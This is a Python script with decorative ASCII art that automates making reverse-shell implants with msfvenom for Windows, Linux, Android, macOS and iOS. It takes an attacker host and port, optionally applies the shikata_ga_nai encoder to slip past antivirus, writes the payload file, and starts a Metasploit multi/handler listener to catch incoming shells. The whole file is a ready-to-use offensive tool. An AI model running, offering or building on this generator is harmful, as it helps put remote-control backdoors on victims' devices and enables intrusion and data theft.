import os


print("""
                             __ ,..---.._
                            +''''`--''-..`--..__
                           .\ _,/:i--._`:-:+._`.``-._
                          /`.._,,' \   `-.``--:.b....=.
                         |`..__,,..`.    '`.__::i--.-::_
                         )- .....--i'\..      --+`'''-'
                       ,' .'.._,.-'|._-b\
                      /,'<'    V   `oi| \\             _.
                     |/ -|,--.." ,'-. ||\..      _.,;:'_<'
                     ''/ |  . ' |\||'\    /-'_/' `.
                    |,','|    , .    .-.|:.`.  + .,:..  |
                 ._,:'/ /-\   '^'   -Y"\\ |.| || /,+8d| |
                .|/,'| |/':: ':=:' ,'|  | | \\|| "+)='  |
                |+,';' /|_/ \     _/ \b':.\  \'| .||   ,'
                ,,:-i''_i' | ``-.Y',. ,|`: | \;- | |_,'
          __   |'| |i:'._ ,'     ,' ,; | |-)-'  __--:b__
         .P|   | |/,'|\  - ._   /  /   _,Y-   ,:/'  `.  `'".._
        ,'|| -','' | ._i._   `':| ,..,'     ,Y;'      \       `- ._
       |||||,..    | \ '-.._ _,' /       _,b-'         `.         '-.
       ||||P..i,  .| '....,-' _,'''''-'''               '    _,..    `\
       +'`   <'/  |`-.....---'                       ._         ,._
        |      |                                    ,'``,:-''''/,--`.
       Y|.b_,,:  |              ||                 ,;,Y'      /     |.
     ,' /'----' .'|   ..       |  |         '"   .`Y'     .,-b_....;;,.
    |+|,'     | | \.,  '      ,'  `:.  _     ,/__`     _=:  _,'``-
   / +,'      | /\_........:.'      '"----:::::'Y  .'.|   |||
   |' '      .'/- \\                          /'|| || |   |||
   |||      /|     \L                        /'|| ||/ |   |||
   `.|    ,'/       .|                      / ,'||/o;/    |||
     `..._,,         |                      |/|   '       |||
       ``-'          |                      |,            |||
                     |          ,.          |             |||
  ,=--------....     |          ""          |             |||
,/,'.            i=..+._             ,..    '..;---:::''- | |
'/|           __....b `-''`---....../.,Y'''''j:.,.._      | `._
.'      _.Y.-'       `..       ii:,'--------' |     :-+. .| | b\
|     .=_,.---'''''--...:..--:'  /         _..-----..:=   | | '|\
|    '-''`'---                  ---'_,,,--''           `,.. |  | \.
 \  .                      ,' _,--''        :dg:      _,/ |||   |  \
`::b\`                 _,-i,-'                 ,..---'    ,|:|  | _|
`'--.:-._      ____,,,;.,'' `--._      ''''''''           |'|' .'  '
     ``'--....Y''-'              `''--..._..____._____...,' |  'o-'
                                             `''''`'''i==_+=_=i__
                                                     ||'''- '    `.
                                                      `-.......-''

""")



# Prompt user to choose target operating system
print("Choose target operating system:")
print("1. Windows")
print("2. Linux")
print("3. Android")
print("4. macOS")
print("5. iOS16")

choice = input("Enter your choice: ")

# Set payload, file name, and file format based on user choice
if choice == "1":
    payload = "windows/meterpreter/reverse_tcp"
    file_format = "exe"
elif choice == "2":
    payload = "linux/x86/meterpreter/reverse_tcp"
    file_format = "elf"
elif choice == "3":
    payload = "android/meterpreter/reverse_tcp"
    file_format = "raw"
elif choice == "4":
    payload = "osx/x86/shell_reverse_tcp"
    file_format = "app"
elif choice == "5":
    payload = "ios/meterpreter/reverse_tcp"
    file_format = "ipa"
else:
    print("Invalid choice")
    exit()

# Prompt user for lhost, lport, and payload name
lhost = input("Enter lhost: ")
lport = input("Enter lport: ")
payload_name = input("Enter payload name: ")

# Set file name based on payload name and file format
file_name = f"{payload_name}.{file_format}"

# Prompt user to specify whether to use encoding
encode = input("Use encoding? (y/n) ")

# Set encoding flag based on user input
if encode.lower() == "y":
    encode_flag = "-e x86/shikata_ga_nai"
else:
    encode_flag = ""

# Generate payload using msfvenom
os.system(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} {encode_flag} -f {file_format} -o {file_name}")

# Prompt user to start reverse multi handler in Metasploit
start_handler = input("Start reverse multi handler in Metasploit? (y/n) ")

if start_handler.lower() == "y":
    os.system(f"msfconsole -x 'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; exploit'")
